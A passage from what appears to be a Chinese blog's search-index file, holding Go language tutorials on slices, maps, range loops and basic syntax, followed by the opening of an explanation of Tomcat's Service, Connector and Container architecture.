class="line">fmt.Println(<span class="string">&quot;长度:&quot;</span>, <span class="built_in">len</span>(test1))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为基本操作的补充，slice 支持比数组更多的操作。</span></span><br><span class="line"><span class="comment">// 其中一个是内建的 append，它返回一个包含了一个或者多个新值的 slice。</span></span><br><span class="line"><span class="comment">// 注意我们接受返回由 append返回的新的 slice 值。</span></span><br><span class="line">test1 = <span class="built_in">append</span>(test1, <span class="string">&quot;D&quot;</span>)</span><br><span class="line">test1 = <span class="built_in">append</span>(test1, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;追加:&quot;</span>, test1)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Slice 也可以被 copy。这里我们创建一个空的和 test1 有相同长度的 slice test2，并且将 test1 复制给 test2。</span></span><br><span class="line">test2 := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="built_in">len</span>(test1))</span><br><span class="line"><span class="built_in">copy</span>(test2, test1)</span><br><span class="line">fmt.Println(<span class="string">&quot;拷贝:&quot;</span>, test2)</span><br><span class="line"><span class="comment">// Slice 支持通过 slice[low:high] 语法进行“切片”操作。例如，这里得到一个包含元素 test1[2], test1[3],test1[4] 的 slice。</span></span><br><span class="line">l := test1[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">fmt.Println(<span class="string">&quot;切片1:&quot;</span>, l)</span><br><span class="line"><span class="comment">// 这个 slice 从 test1[0] 到（但是不包含）test1[5]。</span></span><br><span class="line">l = test1[:<span class="number">5</span>]</span><br><span class="line">fmt.Println(<span class="string">&quot;切片2:&quot;</span>, l)</span><br><span class="line"><span class="comment">// 这个 slice 从（包含）test1[2] 到 slice 的后一个值。</span></span><br><span class="line">l = test1[<span class="number">2</span>:]</span><br><span class="line">fmt.Println(<span class="string">&quot;切片3:&quot;</span>, l)</span><br><span class="line"><span class="comment">// 我们可以在一行代码中声明并初始化一个 slice 变量。</span></span><br><span class="line">t := []<span class="type">string</span>&#123;<span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;数据:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Slice 可以组成多维数据结构。内部的 slice 长度可以不同，这和多位数组不同。</span></span><br><span class="line">twoTest := <span class="built_in">make</span>([][]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">innerLen := i + <span class="number">1</span></span><br><span class="line">twoTest[i] = <span class="built_in">make</span>([]<span class="type">int</span>, innerLen)</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; innerLen; j++ &#123;</span><br><span class="line">twoTest[i][j] = i + j</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 注意，slice 和数组不同，虽然它们通过 fmt.Println 输出差不多。</span></span><br><span class="line">fmt.Println(<span class="string">&quot;二维: &quot;</span>, twoTest)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 键值对 key/value</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mapFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 要创建一个空 map，需要使用内建的 make:make(map[key-type]val-type).</span></span><br><span class="line">map1 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line"><span class="comment">// 使用典型的 make[key] = val 语法来设置键值对。</span></span><br><span class="line">map1[<span class="string">&quot;k1&quot;</span>] = <span class="number">7</span></span><br><span class="line">map1[<span class="string">&quot;k2&quot;</span>] = <span class="number">13</span></span><br><span class="line"><span class="comment">// 使用例如 Println 来打印一个 map 将会输出所有的键值对。</span></span><br><span class="line">fmt.Println(<span class="string">&quot;数据:&quot;</span>, map1)</span><br><span class="line"><span class="comment">// 使用 name[key] 来获取一个键的值</span></span><br><span class="line">v1 := map1[<span class="string">&quot;k1&quot;</span>]</span><br><span class="line">fmt.Println(<span class="string">&quot;值: &quot;</span>, v1)</span><br><span class="line"><span class="comment">// 当对一个 map 调用内建的 len 时，返回的是键值对数目</span></span><br><span class="line">fmt.Println(<span class="string">&quot;长度:&quot;</span>, <span class="built_in">len</span>(map1))</span><br><span class="line"><span class="comment">// 内建的 delete 可以从一个 map 中移除键值对</span></span><br><span class="line"><span class="built_in">delete</span>(map1, <span class="string">&quot;k2&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;数据:&quot;</span>, map1)</span><br><span class="line"><span class="comment">// 当从一个 map 中取值时，可选的第二返回值指示这个键是在这个 map 中。</span></span><br><span class="line"><span class="comment">// 这可以用来消除键不存在和键有零值，像 0 或者 &quot;&quot; 而产生的歧义。</span></span><br><span class="line">_, prs := map1[<span class="string">&quot;k2&quot;</span>]</span><br><span class="line">fmt.Println(<span class="string">&quot;是否存在:&quot;</span>, prs)</span><br><span class="line"><span class="comment">// 你也可以通过这个语法在同一行申明和初始化一个新的map。</span></span><br><span class="line">map2 := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;<span class="string">&quot;F&quot;</span>: <span class="number">1</span>, <span class="string">&quot;B&quot;</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="comment">// 注意一个 map 在使用 fmt.Println 打印的时候，是以 map[k:v k:v]的格式输出的。</span></span><br><span class="line">fmt.Println(<span class="string">&quot;数据:&quot;</span>, map2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Range 遍历</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rangeFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 这里我们使用 range 来统计一个 slice 的元素个数。数组也可以采用这种方法。</span></span><br><span class="line">array1 := []<span class="type">int</span>&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">sum := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _, num := <span class="keyword">range</span> array1 &#123;</span><br><span class="line">sum += num</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;求和:&quot;</span>, sum)</span><br><span class="line"></span><br><span class="line"><span class="comment">// range 在数组和 slice 中都同样提供每个项的索引和值。</span></span><br><span class="line"><span class="comment">// 上面我们不需要索引，所以我们使用 空值定义符_ 来忽略它。</span></span><br><span class="line"><span class="comment">// 有时候我们实际上是需要这个索引的。</span></span><br><span class="line"><span class="keyword">for</span> i, num := <span class="keyword">range</span> array1 &#123;</span><br><span class="line"><span class="keyword">if</span> num == <span class="number">3</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;索引:&quot;</span>, i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// range 在 map 中迭代键值对。</span></span><br><span class="line">map1 := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;<span class="string">&quot;A&quot;</span>: <span class="string">&quot;苹果&quot;</span>, <span class="string">&quot;B&quot;</span>: <span class="string">&quot;香蕉&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> map1 &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s -&gt; %s\n&quot;</span>, k, v)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> k := <span class="keyword">range</span> map1 &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;键:&quot;</span>, k)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// range 在字符串中迭代 unicode 编码。</span></span><br><span class="line"><span class="comment">// 第一个返回值是rune 的起始字节位置，然后第二个是 rune 自己。</span></span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> <span class="string">&quot;abA&quot;</span> &#123;</span><br><span class="line">fmt.Println(i, c)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang基础语法</title>
      <link href="/2025/03/04/golang%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/2025/03/04/golang%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="golang基础语法"><a href="#golang基础语法" class="headerlink" title="golang基础语法"></a>golang基础语法</h1><p>Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。</p><p>Go 语言的基础组成有以下几个部分：</p><ul><li>包声明</li><li>引入包</li><li>函数</li><li>变量</li><li>语句 &amp; 表达式</li><li>注释</li></ul><h2 id="一、基本语法介绍"><a href="#一、基本语法介绍" class="headerlink" title="一、基本语法介绍"></a>一、基本语法介绍</h2><h3 id="行分隔符"><a href="#行分隔符" class="headerlink" title="行分隔符"></a>行分隔符</h3><p>在 Go 程序中，一行代表一个语句结束。不像其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>单行注释是最常见的注释形式，你可以在任何地方使用以 &#x2F;&#x2F; 开头的单行注释。多行注释也叫块注释，均已以 &#x2F;* 开头，并以 *&#x2F; 结尾。</p><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><p>Go 语言的字符串可以通过 <strong>+</strong> 实现：</p><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p>下面列举了 Go 代码中会使用到的 25 个关键字或保留字：</p><table><thead><tr><th>break</th><th>default</th><th>func</th><th>interface</th><th>select</th></tr></thead><tbody><tr><td>case</td><td>defer</td><td>go</td><td>map</td><td>struct</td></tr><tr><td>chan</td><td>else</td><td>goto</td><td>package</td><td>switch</td></tr><tr><td>const</td><td>fallthrough</td><td>if</td><td>range</td><td>type</td></tr><tr><td>continue</td><td>for</td><td>import</td><td>return</td><td>var</td></tr></tbody></table><p>程序一般由关键字、常量、变量、运算符、类型和函数组成。</p><p>程序中可能会使用到这些分隔符：括号 ()，中括号 [] 和大括号 {}。</p><p>程序中可能会使用到这些标点符号：.、,、;、: 和 …。</p><h3 id="二、示例代码"><a href="#二、示例代码" class="headerlink" title="二、示例代码"></a>二、示例代码</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;math&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// hello world</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">hello world</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;##################### values&quot;</span>)</span><br><span class="line">values()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;##################### variables&quot;</span>)</span><br><span class="line">variables()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;##################### constants&quot;</span>)</span><br><span class="line">constants()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;##################### forFunc&quot;</span>)</span><br><span class="line">forFunc()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;##################### ifElse&quot;</span>)</span><br><span class="line">ifElse()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;##################### switchFunc&quot;</span>)</span><br><span class="line">switchFunc()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">values</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 字符串拼接用 +</span></span><br><span class="line">fmt.Println(<span class="string">&quot;hello &quot;</span> + <span class="string">&quot;world &quot;</span> + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="comment">// 整数和浮点数</span></span><br><span class="line">fmt.Println(<span class="string">&quot;1+2 =&quot;</span>, <span class="number">1</span>+<span class="number">2</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;11-1 =&quot;</span>, <span class="number">11</span><span class="number">-1</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;99*99 =&quot;</span>, <span class="number">99</span>*<span class="number">99</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;8.0/3.0 =&quot;</span>, <span class="number">8.0</span>/<span class="number">3.0</span>)</span><br><span class="line"><span class="comment">// 布尔型</span></span><br><span class="line">fmt.Println(<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>)</span><br><span class="line">fmt.Println(<span class="literal">true</span> || <span class="literal">false</span>)</span><br><span class="line">fmt.Println(!<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">variables</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// var 声明 1 个或者多个变量。</span></span><br><span class="line"><span class="keyword">var</span> a <span class="type">string</span> = <span class="string">&quot;hello&quot;</span></span><br><span class="line">fmt.Println(a)</span><br><span class="line"><span class="keyword">var</span> b, c <span class="type">int</span> = <span class="number">3</span>, <span class="number">5</span></span><br><span class="line">fmt.Println(b, c)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会自动推断已经初始化的变量类型。</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="literal">true</span></span><br><span class="line">fmt.Println(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明变量且 初始化为0</span></span><br><span class="line"><span class="keyword">var</span> e <span class="type">int</span></span><br><span class="line">fmt.Println(e)</span><br><span class="line"></span><br><span class="line"><span class="comment">// := 简写会自动推断类型，只能用在初始化</span></span><br><span class="line">f := <span class="string">&quot;short&quot;</span></span><br><span class="line">fmt.Println(f)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常量</span></span><br><span class="line"><span class="comment">// 全局常量</span></span><br><span class="line"><span class="keyword">const</span> con = <span class="string">&quot;const&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">constants</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(con)</span><br><span class="line"></span><br><span class="line"><span class="comment">// const 语句可以出现在任何 var 语句可以出现的地方</span></span><br><span class="line"><span class="keyword">const</span> num = <span class="number">500</span> * <span class="number">500</span> * <span class="number">500</span></span><br><span class="line"><span class="comment">// 常数表达式可以执行任意精度的运算</span></span><br><span class="line"><span class="keyword">const</span> num2 = <span class="number">4e21</span> / num</span><br><span class="line">fmt.Println(num2)</span><br><span class="line"><span class="comment">// 数值型常量是没有确定的类型的，直到它们被给定了一个类型，比如说一次显示的类型转化。</span></span><br><span class="line">fmt.Println(<span class="type">int64</span>(num2))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当上下文需要时，一个数可以被给定一个类型，比如变量赋值或者函数调用。</span></span><br><span class="line"><span class="comment">// 举个例子，这里的 math.Sin函数需要一个 float64 的参数。</span></span><br><span class="line">fmt.Println(math.Sin(num))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// For循环</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">forFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 最常用的方式，带单个循环条件。</span></span><br><span class="line">i := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i &lt;= <span class="number">4</span> &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">i = i + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 经典的初始化/条件/后续形式 for 循环。</span></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">6</span>; j &lt;= <span class="number">8</span>; j++ &#123;</span><br><span class="line">fmt.Println(j)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不带条件的 for 循环将一直执行，直到在循环体内使用了 break 或者 return 来跳出循环。</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;for...&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n := <span class="number">0</span>; n &lt;= <span class="number">7</span>; n++ &#123;</span><br><span class="line"><span class="keyword">if</span> n%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(n)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if/else</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ifElse</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="number">9</span>%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;9 is even&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;9 is odd&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你可以不要 else 只用 if 语句。</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">12</span>%<span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;12 is divisible by 4&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在条件语句之前可以有一个语句；</span></span><br><span class="line"><span class="comment">// 任何在这里声明的变量都可以在所有的条件分支中使用。</span></span><br><span class="line"><span class="keyword">if</span> num := <span class="number">7</span>; num &lt; <span class="number">0</span> &#123;</span><br><span class="line">fmt.Println(num, <span class="string">&quot;正数&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> num &lt; <span class="number">10</span> &#123;</span><br><span class="line">fmt.Println(num, <span class="string">&quot;小于10&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(num, <span class="string">&quot;其他&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意，在 Go 中，你可以不适用圆括号，但是花括号是需要的。</span></span><br><span class="line"><span class="comment">// Go 里没有三目运算符，</span></span><br><span class="line"><span class="comment">// 所以即使你只需要基本的条件判断，你仍需要使用完整的 if 语句。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分支结构</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">switchFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">i := <span class="number">2</span></span><br><span class="line"><span class="keyword">switch</span> i &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在一个 case 语句中，你可以使用逗号来分隔多个表达式。</span></span><br><span class="line"><span class="comment">// 在这个例子中，我们很好的使用了可选的default 分支。</span></span><br><span class="line"><span class="keyword">switch</span> time.Now().Weekday() &#123;</span><br><span class="line"><span class="keyword">case</span> time.Saturday, time.Sunday:</span><br><span class="line">fmt.Println(<span class="string">&quot;星期天&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;工作日&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不带表达式的 switch 是实现 if/else 逻辑的另一种方式。</span></span><br><span class="line"><span class="comment">//  这里展示了 case 表达式是如何使用非常量的。</span></span><br><span class="line">t := time.Now()</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> t.Hour() &lt; <span class="number">12</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;12点前&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;12点后，包含12点&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里是一个函数变量</span></span><br><span class="line">whatAmI := <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line"><span class="keyword">switch</span> t := i.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="type">bool</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;bool&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;int&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Printf(<span class="string">&quot;什么类型 %T\n&quot;</span>, t)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">whatAmI(<span class="literal">true</span>)</span><br><span class="line">whatAmI(<span class="number">1</span>)</span><br><span class="line">whatAmI(<span class="string">&quot;嘿&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tomcat架构</title>
      <link href="/2025/02/23/tomcat%E6%9E%B6%E6%9E%84%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/02/23/tomcat%E6%9E%B6%E6%9E%84%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Tomcat架构"><a href="#Tomcat架构" class="headerlink" title="Tomcat架构"></a>Tomcat架构</h2><p><img src="/./../img/ma/Snipaste_2025-02-18_17-06-58.png" alt="Snipaste_2025-02-18_17-06-58"></p><p>可以看到Tomcat Server大致可以分为三个组件，Service、Connector、Container</p><h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p><strong>Service</strong> 是 Tomcat 的一个主要组件，负责组织和管理 <strong>Connector</strong> 和 <strong>Container</strong> 的工作。一个 <strong>Service</strong> 可以包含多个 <strong>Connector</strong> 和 <strong>Container</strong>。它的作用是将所有相关的资源和功能组合在一起，确保 Tomcat 在处理请求时能够高效地协同工作。</p><h3 id="Connector（连接器）"><a href="#Connector（连接器）" class="headerlink" title="Connector（连接器）"></a>Connector（连接器）</h3><p><strong>Connector</strong> 负责接收来自客户端（如浏览器）的请求，并将这些请求传递给 <strong>Container</strong> 进行处理。它处理网络协议（如 HTTP、HTTPS）和客户端与服务器之间的连接。</p><h3 id="Container（容器）"><a href="#Container（容器）" class="headerlink" title="Container（容器）"></a><strong>Container（容器）</strong></h3><p><strong>Container</strong> 是 Tomcat 的核心，负责实际处理 HTTP 请求的业务逻辑。包含四种子容器：<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code>其中，一个Container对应一个Engine，一个Engine可以包含多个Host，一个Host可以包含多个Context，Context又包含多个Wrapper，各子容器的功能如下</p><h4 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h4><p><strong>Engine</strong> 是 <strong>Container</strong> 中的最顶层组件，负责处理所有的请求。它是 Tomcat 中的请求分发器，能够协调和管理所有的 <strong>Host</strong></p><h4 id="Host（主机）"><a href="#Host（主机）" class="headerlink" title="Host（主机）"></a>Host（主机）</h4><p><strong>Host</strong> 代表一个虚拟主机。一个 <strong>Host</strong> 通常对应一个域名或一个 IP 地址，它处理和管理特定的 Web 应用程序（通常对应于一个或多个网站）。每个 <strong>Host</strong> 可以包含多个 <strong>Context</strong>，每个 <strong>Context</strong> 对应一个 Web 应用。</p><h4 id="Context（上下文）"><a href="#Context（上下文）" class="headerlink" title="Context（上下文）"></a>Context（上下文）</h4><p><strong>Context</strong> 代表一个 Web 应用，是 Tomcat 中的一个应用级容器。一个 <strong>Context</strong> 通常对应一个单独的 Web 应用，它可以包含多个 Servlet、JSP 文件、HTML 页面等内容。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格(“”)或斜杠(&#x2F;)</p><p>下面找一个Tomcat的文件目录对照一下，如下图所示：</p><p><img src="/./../img/ma/Snipaste_2025-02-18_17-28-29.png" alt="Snipaste_2025-02-18_17-28-29"></p><p>Context和Host的区别是Context表示一个应用，我们的Tomcat中默认的配置下webapps下的每一个文件夹目录都是一个Context，其中ROOT目录中存放着主应用，其他目录存放着子应用，而整个webapps就是一个Host站点。</p><h4 id="Wrapper（封装器）"><a 